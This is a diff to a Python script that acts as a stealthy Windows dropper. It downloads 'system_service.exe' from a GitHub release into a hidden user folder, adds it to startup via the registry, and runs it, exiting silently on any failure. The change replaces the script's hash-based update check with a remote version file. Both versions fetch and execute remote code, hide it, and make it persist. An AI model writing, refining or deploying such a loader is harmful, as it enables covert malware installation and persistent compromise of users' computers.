@@ -1,15 +1,15 @@
 import os
-import hashlib
 import urllib.request
 import subprocess
 from pathlib import Path
 import winreg  # For adding to startup
 
 # Hardcoded values
-URL = "https://github.com/yesjdnke/manager/releases/download/love/system_service.exe"
+VERSION_URL = "https://raw.githubusercontent.com/yesjdnke/manager/refs/heads/main/version.txt"
+FILE_URL = "https://github.com/yesjdnke/manager/releases/download/love/system_service.exe"
 FOLDER_NAME = ".hidden_service"
 FILE_NAME = "system_service.exe"
-HASH_FILE_NAME = "file_hash.txt"  # To store the hash of the downloaded file
+VERSION_FILE_NAME = "last_version.txt"  # To store the last downloaded version
 
 def get_user_hidden_folder():
     """Get or create a hidden folder in the user's directory."""
@@ -24,25 +24,25 @@ def download_file(url, dest):
     with urllib.request.urlopen(url) as response, open(dest, 'wb') as out_file:
         out_file.write(response.read())
 
-def compute_file_hash(file_path):
-    """Compute the SHA256 hash of a file."""
-    sha256 = hashlib.sha256()
-    with open(file_path, 'rb') as f:
-        while chunk := f.read(8192):
-            sha256.update(chunk)
-    return sha256.hexdigest()
-
-def save_hash(hash_value, hash_file_path):
-    """Save the file hash to a hash file."""
-    with open(hash_file_path, 'w') as f:
-        f.write(hash_value)
-
-def load_hash(hash_file_path):
-    """Load the saved hash from a hash file."""
-    if not os.path.exists(hash_file_path):
+def get_remote_version():
+    """Fetch the version from the remote URL."""
+    try:
+        with urllib.request.urlopen(VERSION_URL) as response:
+            return response.read().decode('utf-8').strip()
+    except Exception:
         return None
-    with open(hash_file_path, 'r') as f:
+
+def load_local_version(version_file_path):
+    """Load the stored version from a file."""
+    if not os.path.exists(version_file_path):
+        return None
+    with open(version_file_path, 'r') as f:
         return f.read().strip()
+
+def save_local_version(version, version_file_path):
+    """Save the version to a file."""
+    with open(version_file_path, 'w') as f:
+        f.write(version)
 
 def add_to_startup(file_path):
     """Add the file to system startup."""
@@ -60,38 +60,34 @@ def add_to_startup(file_path):
 
 def ensure_and_run_file():
     """
-    Ensure the file is downloaded, hashed, executed, and added to startup.
-    - Downloads if missing.
-    - Saves and compares hashes to delete/replace files as needed.
+    Ensure the file is downloaded, version-checked, executed, and added to startup.
+    - Downloads if the remote version is newer.
+    - Saves the current version locally.
     - Adds to system startup on the first download or replacement.
     - Runs the file after ensuring it is present.
     """
     hidden_folder = get_user_hidden_folder()
     file_path = hidden_folder / FILE_NAME
-    hash_file_path = hidden_folder / HASH_FILE_NAME
+    version_file_path = hidden_folder / VERSION_FILE_NAME
 
-    saved_hash = load_hash(hash_file_path)
+    # Fetch versions
+    remote_version = get_remote_version()
+    if not remote_version:
+        return  # Exit silently if unable to fetch remote version
 
-    # Download and check the new file's hash
-    new_file_path = hidden_folder / f"new_{FILE_NAME}"
+    local_version = load_local_version(version_file_path)
+
+    if local_version == remote_version:
+        # Versions match, no need to download
+        return
+
+    # Download and replace the file
     try:
-        download_file(URL, new_file_path)
-        new_file_hash = compute_file_hash(new_file_path)
+        download_file(FILE_URL, file_path)
+        save_local_version(remote_version, version_file_path)  # Save the new version
+        add_to_startup(file_path)  # Add to startup only on replacement or first download
     except Exception:
-        return  # Exit silently if download or hashing fails
-
-    if saved_hash == new_file_hash:
-        # If the hash matches, delete the new file
-        os.remove(new_file_path)
-    else:
-        # If the hash doesn't match, replace the old file
-        if file_path.exists():
-            os.remove(file_path)  # Remove the current file
-        os.rename(new_file_path, file_path)  # Replace with the new file
-        save_hash(new_file_hash, hash_file_path)  # Save the new hash
-
-        # Add to startup (only on replacement or first download)
-        add_to_startup(file_path)
+        return  # Exit silently if download fails
 
     # Run the file in a non-blocking way
     try:
